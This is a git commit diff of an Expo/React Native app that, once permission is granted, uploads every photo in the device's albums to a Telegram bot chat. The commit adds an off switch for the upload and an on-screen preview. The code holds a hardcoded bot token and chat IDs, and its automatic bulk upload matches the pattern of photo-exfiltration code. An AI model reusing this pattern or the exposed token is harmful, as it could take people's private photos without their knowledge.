8658161e168ccd6123c8ceb95256853d92ca6110
Leonid Yakovlev <lonya.lynya@gmail.com>
2023-01-01 18:08:01 +0400

    save 2

--- App.js
+++ App.js
@@ -1,12 +1,15 @@
 import { StatusBar } from 'expo-status-bar';
-import { StyleSheet, Text, View, PermissionsAndroid } from 'react-native';
+import { StyleSheet, Text, View, PermissionsAndroid, Image } from 'react-native';
 import * as FileSystem from 'expo-file-system'
 import axios from 'axios'
 import { useEffect, useState } from 'react';
 import * as MediaLibrary from 'expo-media-library';
 
 const token = '5800056038:AAH38c9Z13uPEfLAN2ryPAT1mWkHzFWTuEY'
-const chatId = '221971158'
+// const chatId = '221971158'
+const chatId = '-1001519000703'
+
+const SEND_PHOTO = false;
 
 const getAssetFileType = (asset) => {
   const uri = asset.uri;
@@ -16,12 +19,15 @@ const getAssetFileType = (asset) => {
   return type;
 }
 
-const sendAssetsToServer = async (assets, albumName, setProcessStatus, totalCount, isDone) => {
+const sendAssetsToServer = async (assets, albumName, setProcessStatus, totalCount, isDone, setCurrentImage) => {
   for await (const asset of assets) {
     const uri = asset.uri;
 
     try {
       const fileFormat = getAssetFileType(asset);
+
+      // Set current image
+      setCurrentImage(asset);
 
       // Generate Form Data
       const formData = new FormData();
@@ -35,11 +41,14 @@ const sendAssetsToServer = async (assets, albumName, setProcessStatus, totalCoun
 
       // Send to server and wait
 
-      const response = await axios.post(
-        `https://api.telegram.org/bot${token}/sendDocument`, formData, {
-        headers: { "Content-Type": "multipart/form-data" },
+      if (SEND_PHOTO) {
+        const response = await axios.post(
+          `https://api.telegram.org/bot${token}/sendDocument`, formData, {
+          headers: { "Content-Type": "multipart/form-data" },
+        }
+        )
       }
-      )
+
       isDone += 1;
       setProcessStatus(`Uploading from ${albumName} ${asset.filename} ${fileFormat} ... ` + isDone + '/' + totalCount);
       await sleep(500);
@@ -50,7 +59,7 @@ const sendAssetsToServer = async (assets, albumName, setProcessStatus, totalCoun
   }
 }
 
-const processUploadingPhotos = async (setProcessStatus) => {
+const processUploadingPhotos = async (setProcessStatus, setCurrentImage) => {
   setProcessStatus('started...');
   const albums = await MediaLibrary.getAlbumsAsync();
 
@@ -66,13 +75,16 @@ const processUploadingPhotos = async (setProcessStatus) => {
     let total = sorted.length;
 
     if (sorted.length > 0) {
-      await sendAssetsToServer(sorted, album.title, setProcessStatus, total, isDone);
+      await sendAssetsToServer(sorted, album.title, setProcessStatus, total, isDone, setCurrentImage);
     }
   }
 }
 export default function App() {
   const [permissionResponse, requestPermission] = MediaLibrary.usePermissions();
   const [processStatus, setProcessStatus] = useState(null);
+  const [currentImage, setCurrentImage] = useState(null);
+
+  const imageSource = currentImage ? { uri: currentImage.uri } : null;
 
   useEffect(() => {
     if (!permissionResponse?.granted) {
@@ -80,7 +92,7 @@ export default function App() {
       return;
     }
     if (!processStatus) {
-      processUploadingPhotos(setProcessStatus);
+      processUploadingPhotos(setProcessStatus, setCurrentImage);
     }
   }, [permissionResponse])
 
@@ -89,6 +101,7 @@ export default function App() {
     <View style={styles.container}>
       <Text>{processStatus}</Text>
       <StatusBar style="auto" />
+      <Image source={imageSource} />
     </View>
   );
 }
